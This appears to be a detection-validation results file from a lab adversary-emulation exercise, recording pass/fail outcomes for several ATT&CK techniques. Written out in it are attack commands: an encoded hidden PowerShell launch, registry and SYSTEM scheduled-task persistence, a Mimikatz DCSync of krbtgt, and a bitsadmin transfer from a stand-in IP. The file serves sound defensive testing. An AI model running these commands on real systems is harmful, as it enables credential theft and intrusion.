@@ -1,0 +1,98 @@
+{
+  "_meta": {
+    "exercise": "Operation Desert Cipher TTP Emulation — TechPay BoI-CD 362 Validation",
+    "date": "2024-11-08",
+    "platform": "MITRE CALDERA 5.0 + Invoke-AtomicRedTeam 4.5.1",
+    "environment": "CTI Lab Docker Compose (Elastic 8.13.4)",
+    "operator": "CTI Analyst (Lab)"
+  },
+  "operations": [
+    {
+      "operation_id": "op-desert-cipher-01",
+      "name": "Phase 1: Execution and Persistence",
+      "techniques_tested": ["T1059.001", "T1547.001", "T1053.005"],
+      "abilities": [
+        {
+          "ability_id": "e5f0e67d",
+          "name": "PowerShell encoded command execution",
+          "tactic": "execution",
+          "technique_id": "T1059.001",
+          "command": "powershell.exe -NonI -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGI=",
+          "result": "PASS",
+          "detection": "DET-002 fired at 09:14:33Z (28s latency)"
+        },
+        {
+          "ability_id": "a3b4c5d6",
+          "name": "HKCU Run key persistence",
+          "tactic": "persistence",
+          "technique_id": "T1547.001",
+          "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TestPersist /t REG_SZ /d C:\\Windows\\Temp\\test.exe /f",
+          "result": "PASS",
+          "detection": "DET-003 fired (HKCU path matched)"
+        },
+        {
+          "ability_id": "b7c8d9e0",
+          "name": "Scheduled task creation with SYSTEM",
+          "tactic": "persistence",
+          "technique_id": "T1053.005",
+          "command": "schtasks /Create /SC ONLOGON /TN 'TestTask' /TR C:\\Windows\\Temp\\test.exe /RU SYSTEM /F",
+          "result": "PASS",
+          "detection": "DET-004 fired (suspicious /TR path)"
+        }
+      ]
+    },
+    {
+      "operation_id": "op-desert-cipher-02",
+      "name": "Phase 2: Credential Access and Lateral Movement",
+      "techniques_tested": ["T1003.001", "T1003.006"],
+      "abilities": [
+        {
+          "ability_id": "c1d2e3f4",
+          "name": "LSASS memory access (standard)",
+          "tactic": "credential-access",
+          "technique_id": "T1003.001",
+          "command": "C:\\Tools\\Invoke-AtomicTest T1003.001 -TestNumbers 2",
+          "result": "PARTIAL",
+          "detection": "DET-005 fired on 0x1410 mask; did NOT fire on 0x1010 mask (custom test)",
+          "gap": "Sysmon config does not capture 0x1010 LSASS access mask"
+        },
+        {
+          "ability_id": "d5e6f7a8",
+          "name": "DCSync via Mimikatz",
+          "tactic": "credential-access",
+          "technique_id": "T1003.006",
+          "command": "mimikatz.exe \"lsadump::dcsync /user:krbtgt\" exit",
+          "result": "PASS",
+          "detection": "DET-006 fired within 4 seconds — highest confidence detection"
+        }
+      ]
+    },
+    {
+      "operation_id": "op-desert-cipher-03",
+      "name": "Phase 3: Exfiltration",
+      "techniques_tested": ["T1197"],
+      "abilities": [
+        {
+          "ability_id": "e9f0a1b2",
+          "name": "BITS exfiltration via bitsadmin",
+          "tactic": "exfiltration",
+          "technique_id": "T1197",
+          "command": "bitsadmin /transfer TestJob /download /priority FOREGROUND https://198.51.100.44/dummy.bin C:\\temp\\out.bin",
+          "result": "FAIL",
+          "detection": "DET-007 did NOT fire — Atomic test uses Start-BitsTransfer (PowerShell), not bitsadmin.exe",
+          "gap": "DET-007 does not cover Start-BitsTransfer PowerShell BITS method"
+        }
+      ]
+    }
+  ],
+  "detection_coverage_matrix": {
+    "T1059.001": {"covered": true, "rule": "DET-002", "result": "PASS"},
+    "T1547.001": {"covered": true, "rule": "DET-003", "result": "PASS (HKCU)"},
+    "T1053.005": {"covered": true, "rule": "DET-004", "result": "PASS"},
+    "T1003.001": {"covered": true, "rule": "DET-005", "result": "PARTIAL (0x1010 gap)"},
+    "T1003.006": {"covered": true, "rule": "DET-006", "result": "PASS"},
+    "T1197": {"covered": true, "rule": "DET-007", "result": "FAIL (PS BITS gap)"},
+    "T1566.001": {"covered": false, "rule": "DET-001", "result": "FAIL (no cloud log ingestion)"},
+    "T1557": {"covered": false, "rule": "DET-001", "result": "FAIL (no cloud log ingestion)"}
+  }
+}
